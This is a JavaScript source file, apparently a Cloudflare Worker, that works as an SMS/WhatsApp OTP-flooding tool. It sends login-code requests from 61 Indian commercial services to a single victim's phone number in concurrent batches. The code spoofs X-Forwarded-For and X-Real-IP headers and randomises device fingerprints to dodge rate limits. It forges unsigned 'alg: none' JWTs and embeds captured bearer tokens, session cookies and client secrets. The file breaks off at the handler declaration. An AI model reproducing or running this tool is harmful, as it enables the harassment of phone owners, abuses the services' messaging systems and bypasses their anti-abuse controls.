// ========================
// Helper Functions
// ========================

function base64urlEncode(str) {
    return btoa(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        const r = Math.random() * 16 | 0;
        const v = c === 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

function randomAndroidId() {
    return Array.from({length: 8}, () =>
        Math.floor(Math.random() * 0xffff).toString(16).padStart(4, '0')
    ).join('');
}

function randomDeviceId() { return randomAndroidId(); }

function randomIP() {
    return Math.floor(Math.random() * 255) + 1 + '.' +
           Math.floor(Math.random() * 256) + '.' +
           Math.floor(Math.random() * 256) + '.' +
           (Math.floor(Math.random() * 255) + 1);
}

function randomUserAgent() {
    const av = ['9','10','11','12','13','14'];
    const cv = ['120','121','122','123','124','125','126','127','128','129','130','131','132','133','134','135','136','137','138','139','140','141','142','143','144','145','146','147','148'];
    const models = ['RMX3081','SM-G998B','Pixel 6','OnePlus 9','SM-A528B','M2012K11AG','SM-N986B','Redmi Note 10','SM-G991B','Pixel 5'];
    const builds = ['RKQ1.211119.001','SP1A.210812.016','TP1A.220624.014','TQ3A.230901.001'];
    const a = av[Math.floor(Math.random() * av.length)];
    const c = cv[Math.floor(Math.random() * cv.length)];
    const m = models[Math.floor(Math.random() * models.length)];
    const b = builds[Math.floor(Math.random() * builds.length)];
    return `Mozilla/5.0 (Linux; Android ${a}; ${m} Build/${b}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${c}.0.0.0 Mobile Safari/537.36`;
}

function generateAstroyogiToken() {
    const header = JSON.stringify({ alg: 'none', typ: 'JWT' });
    const payload = JSON.stringify({
        UserType: 'TtaAppUser', EntityId: '29426901',
        SourceUserType: 'TtaAppUser', SourceEntityId: '29426901',
        nbf: Math.floor(Date.now() / 1000), exp: Math.floor(Date.now() / 1000) + 7776000
    });
    return base64urlEncode(header) + '.' + base64urlEncode(payload) + '.';
}

function generateAstroyogiWebToken() {
    const header = JSON.stringify({ alg: 'none', typ: 'JWT' });
    const payload = JSON.stringify({
        UserType: 'WebUser', EntityId: '0', SourceUserType: '', SourceEntityId: '',
        nbf: Math.floor(Date.now() / 1000), exp: Math.floor(Date.now() / 1000) + 7776000
    });
    return base64urlEncode(header) + '.' + base64urlEncode(payload) + '.';
}

function randomHex(len = 32) {
    let s = '';
    for (let i = 0; i < len; i++) s += Math.floor(Math.random() * 16).toString(16);
    return s;
}
function randomDeviceName() { const m = ['samsungSM-S918B','samsungSM-A546E','samsungSM-G991B','OnePlusLE2101','OnePlusNE2211','XiaomiMI11X','XiaomiM2101K7AI','RedmiNote12','realmeRMX3366','vivoV2130','OPPOA54','GooglePixel7','NothingA065']; return m[Math.floor(Math.random() * m.length)]; }
function randomFCMToken() { return randomHex(20) + ':' + randomHex(40) + ':APA91b' + randomHex(60); }
function randomLat() { return (Math.random() * 1 + 25).toFixed(5); }
function randomLng() { return (Math.random() * 1 + 86).toFixed(5); }
function randomAppVer() { return String(Math.floor(Math.random() * 100 + 500)); }
function randomOS() { return String(Math.floor(Math.random() * 6 + 9)); }
function randomBuild() { const b = ['RKQ1.211119.001','SP1A.210812.016','TP1A.220624.014','TQ3A.230901.001']; return b[Math.floor(Math.random() * b.length)]; }
function randomDeviceModel() { const m = ['RMX3081','SM-G998B','Pixel 6','OnePlus 9','SM-A528B','M2012K11AG','SM-N986B','Redmi Note 10','SM-G991B','Pixel 5']; return m[Math.floor(Math.random() * m.length)]; }

function replacePlaceholders(str, mobile) {
    if (typeof str !== 'string') return str;
    const reps = {
        '{no}': mobile, '{rand_ip}': randomIP(), '{rand_ua}': randomUserAgent(),
        '{rand_uuid}': generateUUID(), '{rand_device}': randomAndroidId(),
        '{rand_device_id}': randomDeviceId(), '{rand_device_name}': randomDeviceName(),
        '{rand_device_model}': randomDeviceModel(), '{rand_build}': randomBuild(),
        '{rand_session}': randomHex(32), '{rand_nonce}': randomHex(12),
        '{rand_ts}': String(Math.floor(Date.now() / 1000)),
        '{rand_fcm}': randomFCMToken(), '{rand_lat}': randomLat(), '{rand_lng}': randomLng(),
        '{rand_os}': randomOS(), '{rand_app_ver}': randomAppVer(),
        '{astroyogi_token}': generateAstroyogiToken(),
        '{astroyogi_web_token}': generateAstroyogiWebToken(),
    };
    let out = str;
    for (const k in reps) out = out.split(k).join(reps[k]);
    return out;
}

// ========================
// API Call Function
// ========================
async function callAPI(url, method, headers, data = null, retries = 0) {
    let lastResult = null;
    for (let attempt = 0; attempt <= retries; attempt++) {
        if (attempt > 0) await new Promise(r => setTimeout(r, 400 * attempt));
        try {
            const finalHeaders = {
                'X-Forwarded-For': randomIP(),
                'X-Real-IP': randomIP(),
                'User-Agent': headers['User-Agent'] || headers['user-agent'] || randomUserAgent(),
                'Accept': headers['Accept'] || headers['accept'] || 'application/json, text/plain, */*',
                'Accept-Language': headers['Accept-Language'] || headers['accept-language'] || 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'close',
                ...headers
            };
            const options = { method, headers: finalHeaders, redirect: 'follow' };
            if (data && method === 'POST') options.body = data;

            const start = Date.now();
            const response = await fetch(url, options);
            const httpcode = response.status;
            const responseText = await response.text();
            const time = Date.now() - start;
            const success = httpcode >= 200 && httpcode < 300;

            if (success || (httpcode >= 400 && httpcode < 500 && httpcode !== 429)) {
                return { response: responseText.slice(0, 250), httpcode, success, time };
            }
            lastResult = { response: responseText.slice(0, 250), httpcode, success, time };
        } catch (error) {
            lastResult = { response: 'ERROR: ' + error.message, httpcode: 0, success: false, time: 0 };
        }
    }
    return lastResult || { response: 'FAILED', httpcode: 0, success: false, time: 0 };
}

// ========================
// ALL APIS (61 total)
// ========================
const APIS = [
    // ========== RANDOM WALI ==========

    { name: "Nutrabay SMS", url: "https://nutrabay.com/api/on-boarding/mobile-otp", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://nutrabay.com", "referer": "https://nutrabay.com/sale/nutrabay-sale/" },
      body: (m) => JSON.stringify({ mobile: m, c_code: "+91", otp_channel: 2, type: "login" }) },

    { name: "Nutrabay WhatsApp", url: "https://nutrabay.com/api/on-boarding/mobile-otp", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://nutrabay.com", "referer": "https://nutrabay.com/sale/nutrabay-sale/" },
      body: (m) => JSON.stringify({ mobile: m, c_code: "+91", otp_channel: 8, type: "login" }) },

    { name: "MuscleBlaze SMS", url: "https://www.muscleblaze.com/veronica/user/validate/9/{no}/signup?plt=2&st=9", method: "GET",
      headers: { "referer": "https://www.muscleblaze.com/" }, body: null },

    { name: "MuscleBlaze WhatsApp", url: "https://www.muscleblaze.com/veronica/user/validate/whatsapp/9/{no}/signup?plt=2&st=9", method: "GET",
      headers: { "referer": "https://www.muscleblaze.com/" }, body: null },

    { name: "GetVisitApp SMS", url: "https://api.getvisitapp.com/v3/new-auth/login-phone", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://web.getvisitapp.com", "referer": "https://web.getvisitapp.com/" },
      body: (m) => JSON.stringify({ phone: m, countryCode: 91, platform: "WEB", ssoInfo: null, storedUTMParams: {}, emailCode: "", evId: "" }) },

    { name: "GetVisitApp WhatsApp", url: "https://api.getvisitapp.com/v3/new-auth/login-phone", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://web.getvisitapp.com", "referer": "https://web.getvisitapp.com/" },
      body: (m) => JSON.stringify({ channel: "whatsapp", resend: true, countryCode: 91, phone: m, platform: "WEB" }) },

    { name: "Landeed SMS", url: "https://backend.landeed.com/api/v1/auth/browser_otp_login", method: "POST",
      headers: { "Content-Type": "application/json", "platform": "Web", "Origin": "https://web.landeed.com", "Referer": "https://web.landeed.com/" },
      body: (m) => JSON.stringify({ country_code: "+91", phone_number: m, delivery_method: "SMS", app_version: "0.75.0", binary_version: "0" }) },

    { name: "Landeed WhatsApp", url: "https://backend.landeed.com/api/v1/auth/browser_otp_login", method: "POST",
      headers: { "Content-Type": "application/json", "platform": "Web", "Origin": "https://web.landeed.com", "Referer": "https://web.landeed.com/" },
      body: (m) => JSON.stringify({ country_code: "+91", phone_number: m, delivery_method: "WHATSAPP", app_version: "0.75.0", binary_version: "0" }) },

    { name: "Redcliffe Labs", url: "https://app.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://redcliffelabs.com", "referer": "https://redcliffelabs.com/" },
      body: (m) => JSON.stringify({ phone_number: m, short: true, country_code: "+91", medium: "" }) },

    { name: "Gritzo SMS", url: "https://www.gritzo.com/veronica/user/validate/187/{no}/signup?plt=2&st=187", method: "GET",
      headers: { "referer": "https://www.gritzo.com/" }, body: null },

    { name: "Gritzo WhatsApp", url: "https://www.gritzo.com/veronica/user/validate/whatsapp/187/{no}/signup?plt=2&st=187", method: "GET",
      headers: { "referer": "https://www.gritzo.com/" }, body: null },

    { name: "HKVitals SMS", url: "https://www.hkvitals.com/veronica/user/validate/42/{no}/signup?plt=2&st=42", method: "GET",
      headers: { "referer": "https://www.hkvitals.com/" }, body: null },

    { name: "HKVitals WhatsApp", url: "https://www.hkvitals.com/veronica/user/validate/whatsapp/42/{no}/signup?plt=2&st=42", method: "GET",
      headers: { "referer": "https://www.hkvitals.com/" }, body: null },

    { name: "TrueBasics SMS", url: "https://www.truebasics.com/veronica/user/validate/26/{no}/signup?plt=2&st=26", method: "GET",
      headers: { "referer": "https://www.truebasics.com/" }, body: null },

    { name: "TrueBasics WhatsApp", url: "https://www.truebasics.com/veronica/user/validate/whatsapp/26/{no}/signup?plt=2&st=26", method: "GET",
      headers: { "referer": "https://www.truebasics.com/" }, body: null },

    { name: "HealthKart SMS", url: "https://www.healthkart.com/veronica/user/validate/1/{no}/signup?plt=2&st=1", method: "GET",
      headers: { "referer": "https://www.healthkart.com/" }, body: null },

    { name: "HealthKart WhatsApp", url: "https://www.healthkart.com/veronica/user/validate/whatsapp/1/{no}/signup?plt=2&st=1", method: "GET",
      headers: { "referer": "https://www.healthkart.com/" }, body: null },

    { name: "Clinikally", url: "https://api.clinikally.com/hodor/v1/auth/request_otp", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://www.clinikally.com", "referer": "https://www.clinikally.com/" },
      body: (m) => JSON.stringify({ mobile_number: "+91" + m }) },

    { name: "ShemarooMe", url: "https://www.shemaroome.com/users/mobile_no_signup", method: "POST",
      headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.shemaroome.com", "referer": "https://www.shemaroome.com/users/sign_in" },
      body: (m) => `mobile_no=+91${m}&registration_source=organic` },

    { name: "GoldenBus", url: "https://m.goldenbus.in/user/sending-otp", method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://m.goldenbus.in", "Referer": "https://m.goldenbus.in/" },
      body: (m) => `mobileNumber=${m}&captacha=eWyHa` },

    { name: "IGP", url: "https://www.igp.com/v2/loginSignup", method: "POST",
      headers: { "content-type": "application/json; charset=UTF-8", "origin": "https://www.igp.com", "referer": "https://www.igp.com/" },
      body: (m) => JSON.stringify({ email: "", mprefix: "91", mob: m, cid: "99", claimNumber: false, newUserFlag: false, verifyOtp: false, otp: "", isGuest: false, isInternational: false }) },

    { name: "Interflora", url: "https://www.interflora.in/v2/loginSignup", method: "POST",
      headers: { "content-type": "application/json; charset=UTF-8", "origin": "https://www.interflora.in", "referer": "https://www.interflora.in/" },
      body: (m) => JSON.stringify({ email: "", mprefix: "91", mob: m, cid: "99", claimNumber: false, newUserFlag: false, verifyOtp: false, otp: "", isGuest: false, isInternational: false }) },

    { name: "Slikk SMS", url: "https://gateway.api.slikkclub.com/v1/auth/login", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://www.slikk.club", "referer": "https://www.slikk.club/" },
      body: (m) => JSON.stringify({ mobile: m, countryCode: "+91", deviceId: randomDeviceId(), otpType: "sms" }) },

    { name: "Slikk WhatsApp", url: "https://gateway.api.slikkclub.com/v1/auth/login", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://www.slikk.club", "referer": "https://www.slikk.club/" },
      body: (m) => JSON.stringify({ mobile: m, countryCode: "+91", deviceId: randomDeviceId(), otpType: "whatsapp" }) },

    { name: "HDFC Ergo SMS", url: "https://here.co.in/users/v1/customer-portal/send-otp", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://www.hdfcergo.com", "referer": "https://www.hdfcergo.com/" },
      body: (m) => JSON.stringify({ mobile: m, countryCodeId: "b43569eb-6798-43fb-8d27-47d55d7c544b", source: "sms", encryptedMobileNumber: "952aeed881a78380d02e3e290c1cbe7f" }) },

    { name: "HDFC Ergo WhatsApp", url: "https://here.co.in/users/v1/customer-portal/send-otp", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://www.hdfcergo.com", "referer": "https://www.hdfcergo.com/" },
      body: (m) => JSON.stringify({ mobile: m, countryCodeId: "b43569eb-6798-43fb-8d27-47d55d7c544b", source: "whatsapp", encryptedMobileNumber: "952aeed881a78380d02e3e290c1cbe7f" }) },

    { name: "KPN Fresh", url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://www.kpnfresh.com", "referer": "https://www.kpnfresh.com/" },
      body: (m) => JSON.stringify({ phone_number: { number: m, country_code: "+91" } }) },

    { name: "Cuemath", url: "https://leap.cuemath.com/api/v1/otp/phone/", method: "POST",
      headers: { "content-type": "application/JSON", "origin": "https://leap.cuemath.com", "referer": "https://leap.cuemath.com/login" },
      body: (m) => JSON.stringify({ phone: m, source: "login" }) },

    { name: "Atlys", url: "https://api.atlys.com/api/v1/auth/phone", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://www.atlys.com", "referer": "https://www.atlys.com/" },
      body: (m) => JSON.stringify({ iso2_code: "IN", phone: "+91" + m }) },

    { name: "BeBodywise", url: "https://api.bebodywise.com/portal/auth/send-otp?client=mobile-web", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://bebodywise.com", "referer": "https://bebodywise.com/", "brand": "BW" },
      body: (m) => JSON.stringify({ phoneNumber: m, source: "", resend: false }) },

    { name: "CityMall", url: "https://citymall.live/web-api/auth/send-otp", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://citymall.live", "referer": "https://citymall.live/" },
      body: (m) => JSON.stringify({ phone_number: m }) },

    { name: "SatvaCart", url: "https://oms.satvacart.com/customer/auth/send_otp/", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://www.satvacart.com", "referer": "https://www.satvacart.com/" },
      body: (m) => JSON.stringify({ phone_number: m }) },

    { name: "Auricle", url: "https://auricle.co.in/mobile-verify", method: "POST",
      headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://auricle.co.in", "referer": "https://auricle.co.in/login", "x-csrf-token": randomHex(32) },
      body: (m) => `mobile=+91${m}&device_id=Mozilla/5.0+(Linux;+Android+10;+K)+AppleWebKit/537.36` },

    { name: "DoctorC", url: "https://doctorc.in/api/otp/", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://doctorc.in", "referer": "https://doctorc.in/login/", "x-csrftoken": randomHex(32) },
      body: (m) => JSON.stringify({ phone_number: m, should_resend: false }) },

    { name: "Licious", url: "https://www.licious.in/api/login/signup", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://www.licious.in", "referer": "https://www.licious.in/profile" },
      body: (m) => JSON.stringify({ phone: m, captcha_token: "" }) },

    { name: "CityFurnish SMS", url: "https://api.cityfurnish.com/api/user/sendOtpV2", method: "POST",
      headers: { "Content-Type": "application/json", "Origin": "https://cityfurnish.com", "Referer": "https://cityfurnish.com/" },
      body: (m) => JSON.stringify({ mobileNumber: m }) },

    { name: "CityFurnish WhatsApp", url: "https://api.cityfurnish.com/api/user/sendOtpV2", method: "POST",
      headers: { "Content-Type": "application/json", "Origin": "https://cityfurnish.com", "Referer": "https://cityfurnish.com/" },
      body: (m) => JSON.stringify({ mobileNumber: m, channel: "whatsapp" }) },

    { name: "OneWay Send OTP", url: "https://oneway.cab/api/auth/send-otp", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://oneway.cab", "referer": "https://oneway.cab/" },
      body: (m) => JSON.stringify({ mobileNo: m, passengerName: "Black", email: "", fromCity: "", toCity: "" }) },

    { name: "OneWay Resend OTP", url: "https://oneway.cab/api/auth/resend-otp", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://oneway.cab", "referer": "https://oneway.cab/" },
      body: (m) => JSON.stringify({ mobileNo: m }) },

    { name: "WeCredit", url: "https://wecredit.co.in/api/auth", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://wecredit.co.in", "referer": "https://wecredit.co.in/" },
      body: (m) => JSON.stringify({ mobile: m, endpoint: "login", lenderName: "WC001" }) },

    { name: "eBullion", url: "https://api.ebullion.in/login/send/otp", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://secure.ebullion.in", "referer": "https://secure.ebullion.in/", "authorization": "Bearer null" },
      body: (m) => JSON.stringify({ mobile: "+91" + m, partnerId: "1" }) },

    { name: "CureBay", url: "https://meds-gateway-api.curebay.com/api-gateway/authenticate/sendOtp?mobileNo={no}", method: "POST",
      headers: { "origin": "https://meds.curebay.com", "referer": "https://meds.curebay.com/" }, body: null },

    { name: "HyperPure", url: "https://api.hyperpure.com/api/verifyUser?phoneNumber={no}", method: "GET",
      headers: { "origin": "https://www.hyperpure.com", "referer": "https://www.hyperpure.com/" }, body: null },

    { name: "ManMatters", url: "https://api.manmatters.com/portal/auth/send-otp?client=mobile-web", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://manmatters.com", "referer": "https://manmatters.com/", "brand": "MM" },
      body: (m) => JSON.stringify({ phoneNumber: m, resend: true, source: "" }) },

    { name: "IndMoney", url: "https://apixt-iw.indmoney.com/indshield/public/ext/v4/otp/generate", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://www.indmoney.com", "referer": "https://www.indmoney.com/" },
      body: (m) => JSON.stringify({ countryCode: "+91", mobile: m, identity_token: "" }) },

    { name: "PocketFM", url: "https://pocketfm.com/login", method: "POST",
      headers: { "content-type": "text/plain;charset=UTF-8", "origin": "https://pocketfm.com" },
      body: (m) => JSON.stringify([{ phone_number: "+91" + m, country_code: "+91" }]) },

    { name: "Refyne", url: "https://prod-api.refyne.co.in/auth/v3/send-otp", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://app.refyne.co.in", "referer": "https://app.refyne.co.in/" },
      body: (m) => JSON.stringify({ channel: "SMS", recipient: m }) },

    { name: "RailRestro", url: "https://www.railrestro.com/auth/request", method: "POST",
      headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.railrestro.com", "referer": "https://www.railrestro.com/login" },
      body: (m) => `_token=${randomHex(40)}&username=${m}&remember=` },

    { name: "InstaAstro", url: "https://instaastro.com/v1/users/website-phone-login/login/new/", method: "POST",
      headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://instaastro.com", "referer": "https://instaastro.com/" },
      body: (m) => `phone_number=+91${m}&dynamic_api_key=aW5zdGEyMDIzd2Vi&csrfmiddlewaretoken=${randomHex(64)}&g_recaptcha=` },

    { name: "Riggle", url: "https://api.riggleapp.in/api/v1/user/auth/send_otp/", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://app.riggleapp.in", "referer": "https://app.riggleapp.in/", "x-app-name": "plug" },
      body: (m) => JSON.stringify({ mobile: m, agreement: true }) },

    { name: "Call Astro", url: "https://www.call-astro.com/user/userlogin", method: "POST",
      headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.call-astro.com", "referer": "https://www.call-astro.com/user/login" },
      body: (m) => `method=whatsapp&mobile=${m}&country=+91-10&_token=${randomHex(40)}` },

    { name: "Jugnoo OTP", url: "https://prod-autos-api.jugnoo.in/v4/customer/generate_login_otp", method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "okhttp/5.0.0-alpha.2" },
      body: (m) => new URLSearchParams({
          phone_no: "+91" + m, country: "India",
          last_opened_client_id: randomDeviceId(), operator_token: randomHex(32),
          app_version: randomAppVer(), login_type: "0", os_version: randomOS(),
          latitude: randomLat(), device_type: "0", source: "download_source=playstore",
          locale: "en", client_id: randomDeviceId(), device_rooted: "0",
          customer_package_name: "product.clicklabs.jugnoo", country_code: "+91",
          device_name: randomDeviceName(), device_token: randomFCMToken(),
          unique_device_id: randomDeviceId(), longitude: randomLng(), last_push_time_diff: "-1"
      }).toString() },

    { name: "PolicyX", url: "https://www.policyx.com/user_login/customer-login-webservice.php", method: "POST",
      headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.policyx.com", "referer": "https://www.policyx.com/customer-login/" },
      body: (m) => `PhoneNumber=${m}&captcha=5m5hg4&action=validate_captcha&_pxtoken=c44a4eab406fe8ab47ae5b14ea04fa36` },

    { name: "Rupee112", url: "https://www.rupee112.com/login-sbm", method: "POST",
      headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.rupee112.com", "referer": "https://www.rupee112.com/apply-now" },
      body: (m) => `mobile=${m}&current_page=login&is_existing_customer=2&device_id=${randomDeviceId()}&captcha=iudoF&require_captcha=1&tnc=true` },

    { name: "TheSouledStore", url: "https://api.thesouledstore.com/api/v2/register-otp?platform=web", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://www.thesouledstore.com", "referer": "https://www.thesouledstore.com/" },
      body: (m) => JSON.stringify({ firstname: "Black ", lastname: "Devil ", email: "test" + Date.now() + "@test.com", password: "998877", cpassword: "998877", telephone: m, birthdate: "2000-01-03", gender: "M", token: "" }) },

    { name: "Airpaz", url: "https://next-api.airpaz.com/v2/member/login-request", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://www.airpaz.com", "referer": "https://www.airpaz.com/", "x-country": "IN" },
      body: (m) => JSON.stringify({ mobileCode: "IN", mobile: m, lang: "en", channel: "wa" }) },

    { name: "Zynerd", url: "https://infra.zynerd.com/api_v3/auth/send_otp", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://www.zynerd.com", "referer": "https://www.zynerd.com/" },
      body: (m) => JSON.stringify({ phone_no: "+91-" + m, medium: "SMS" }) },

    { name: "Prestige", url: "https://www.prestigeconstructions.com/api/apicall", method: "POST",
      headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.prestigeconstructions.com", "referer": "https://www.prestigeconstructions.com/upcoming-projects" },
      body: (m) => `dynamicurl=employee/v2/customersendotp&Mobile_No=${m}&Mobile_CountryCode=+91&whatsapp_nri=0` },

    // ========== ORIGINAL WALI ==========

    { name: "Zostel", url: "https://api.io.zo.xyz/api/v1/auth/login/mobile/otp/", method: "POST",
      headers: { "host": "api.io.zo.xyz", "content-type": "application/json",
        "client-device-secret": "MTc5MTY0MjY1NzIzMjA1MDEwNTM3MzYxNDgwMDA1MzczNjgwMDM2MDI0NjQ0Mjg1djhhaG1qZ2swb2g=",
        "client-device-id": "05010537361480005373680036024644285v8ahmjgk0oh",
        "client-key": "c26ea3e427cf42a88a18",
        "origin": "https://www.zostel.com", "referer": "https://www.zostel.com/" },
      body: (m) => JSON.stringify({ mobile_number: m, mobile_country_code: "91", captcha_response_token: "" }) },

    { name: "Vetic SMS", url: "https://org.vetic.in/iam-service/iam/web/send-otp/", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://vetic.in", "referer": "https://vetic.in/",
        "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3OTE2NDI3OTcsImV4cCI6MTc5MTY0NjM5Nywic3ViIjp7Imd1ZXN0X3VzZXJfaWQiOiI2MzQ4MWE1Ny05MDcxLTRmYzEtOTM5MS00ZjBkOTIzOWJkZjAifX0.QKXX3_wy5snrcaj7QkJDnFP91gx7GIchXeLY9DcKaOw" },
      body: (m) => JSON.stringify({ mobile: m, name: "Devil ", fcm_registration_id: "", is_physical_device: false, device_os: "android", device_os_version: "15", device_model: "RE58A5L1", device_brand: "realme", device_id: "2410e73a-08e8-4f97-963e-075e1c7f22fa", advertising_id: "", app_version: "3.9.5", app_build_number: "145", source_id: "1", whatsapp_otp_request: false, utm_source: "web-app", utm_content: "web-app", referer_url: "https://vetic.in/", traffic_source: "web-app" }) },

    { name: "Vetic WhatsApp", url: "https://org.vetic.in/iam-service/iam/web/send-otp/", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://vetic.in", "referer": "https://vetic.in/",
        "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3OTE2NDI3OTcsImV4cCI6MTc5MTY0NjM5Nywic3ViIjp7Imd1ZXN0X3VzZXJfaWQiOiI2MzQ4MWE1Ny05MDcxLTRmYzEtOTM5MS00ZjBkOTIzOWJkZjAifX0.QKXX3_wy5snrcaj7QkJDnFP91gx7GIchXeLY9DcKaOw" },
      body: (m) => JSON.stringify({ mobile: m, name: "Devil ", fcm_registration_id: "", is_physical_device: false, device_os: "android", device_os_version: "15", device_model: "RE58A5L1", device_brand: "realme", device_id: "2410e73a-08e8-4f97-963e-075e1c7f22fa", advertising_id: "", app_version: "3.9.5", app_build_number: "145", source_id: "1", whatsapp_otp_request: true, utm_source: "web-app", utm_content: "web-app", referer_url: "https://vetic.in/", traffic_source: "web-app" }) },

    { name: "Lenskart", url: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", method: "POST",
      headers: { "content-type": "application/json", "origin": "https://www.lenskart.com", "referer": "https://www.lenskart.com/",
        "x-country-code": "IN", "x-session-token": "60418799-09fc-43a2-a429-b8fdf0880d19", "x-api-client": "mobilesite", "x-customer-type": "NEW" },
      body: (m) => JSON.stringify({ captcha: null, phoneCode: "+91", telephone: m }) },

    { name: "LegalKart WhatsApp", url: "https://lkapi.legalkart.com/api/v1/auth/login/send-otp", method: "POST",
      headers: { "host": "lkapi.legalkart.com", "content-type": "application/json",
        "x-portal": "LAWYER", "origin": "https://lawyers.legalkart.com", "referer": "https://lawyers.legalkart.com/" },
      body: (m) => JSON.stringify({ mobile: m, dialingCode: "91", otpChannel: "WHATSAPP" }) },

    { name: "LegalKart SMS", url: "https://lkapi.legalkart.com/api/v1/auth/login/send-otp", method: "POST",
      headers: { "host": "lkapi.legalkart.com", "content-type": "application/json",
        "x-portal": "LAWYER", "origin": "https://lawyers.legalkart.com", "referer": "https://lawyers.legalkart.com/" },
      body: (m) => JSON.stringify({ mobile: m, dialingCode: "91", otpChannel: "SMS" }) },

    { name: "BlueStone", url: "https://www.bluestone.com/generate-and-send-otp", method: "POST",
      headers: { "host": "www.bluestone.com", "content-type": "application/x-www-form-urlencoded",
        "origin": "https://www.bluestone.com", "referer": "https://www.bluestone.com/",
        "cookie": "JSESSIONID=00065F18AF2677F00FC0E8F894083479; pincode=110001; obref=2649569d-0040-4bb6-b039-6d9f3370b448; kp_user_id=019e9374-e36e-7c76-b2a9-6d81c17ca190; shopflo_session_id=b0a31e00-b3fd-4f6f-bdcf-f08bba311e94" },
      body: (m) => `contactNumberOrEmail=${m}&isSignUp=true` },

    { name: "Astroyogi App", url: "https://api.astroyogi.com/api/v3/user/sendOtp", method: "POST",
      headers: { "Content-Type": "application/json; charset=utf-8", "Authorization": "Bearer {astroyogi_token}",
        "User-Agent": "okhttp/4.9.0", "Accept": "application/json" },
      body: (m) => JSON.stringify({ country_code: "+91", mobile: m, device_id: randomDeviceId(), device_model: randomDeviceModel(), os_version: randomOS(), build_number: randomBuild() }) },

    { name: "Astroyogi Web", url: "https://www.astroyogi.com/api/v3/user/sendOtp", method: "POST",
      headers: { "Content-Type": "application/json; charset=utf-8", "Authorization": "Bearer {astroyogi_web_token}",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json, text/plain, */*", "Origin": "https://www.astroyogi.com", "Referer": "https://www.astroyogi.com/" },
      body: (m) => JSON.stringify({ country_code: "+91", mobile: m, source: "web" }) },

    { name: "GetZype", url: "https://stage-api-gateway.getzype.com/auth/signinup/code", method: "POST",
      headers: { "Content-Type": "application/json; charset=utf-8", "User-Agent": "okhttp/3.9.1" },
      body: (m) => JSON.stringify({ hashKey: "", phoneNumber: "+91" + m }) }
];

// ========================
// Execute All APIs
// ========================
async function executeAll(mobile) {
    const results = [];
    let successful = 0, failed = 0;
    const startTime = Date.now();

    const shuffled = APIS.slice().sort(() => Math.random() - 0.5);
    const CONCURRENCY = 10;
    const batches = [];
    for (let i = 0; i < shuffled.length; i += CONCURRENCY) {
        batches.push(shuffled.slice(i, i + CONCURRENCY));
    }

    for (const batch of batches) {
        const batchPromises = batch.map(async (api) => {
            const url = replacePlaceholders(api.url, mobile);
            const headers = {};
            for (const k in (api.headers || {})) headers[k] = replacePlaceholders(api.headers[k], mobile);

            let data = null;
            if (typeof api.body === 'function') data = api.body(mobile);
            else if (typeof api.body === 'string') data = replacePlaceholders(api.body, mobile);

            const r = await callAPI(url, api.method, headers, data, 0);
            return { name: api.name, httpCode: r.httpcode, time: r.time || 0, success: r.success, response: r.response };
        });

        const batchResults = await Promise.all(batchPromises);
        for (const r of batchResults) {
            results.push(r);
            if (r.success) successful++; else failed++;
        }
        if (batches.indexOf(batch) < batches.length - 1) {
            await new Promise(res => setTimeout(res, 300));
        }
    }

    return { results, successful, failed, totalTime: ((Date.now() - startTime) / 1000).toFixed(2) };
}

// ========================
// Cloudflare Worker Handler
// ========================
export default {
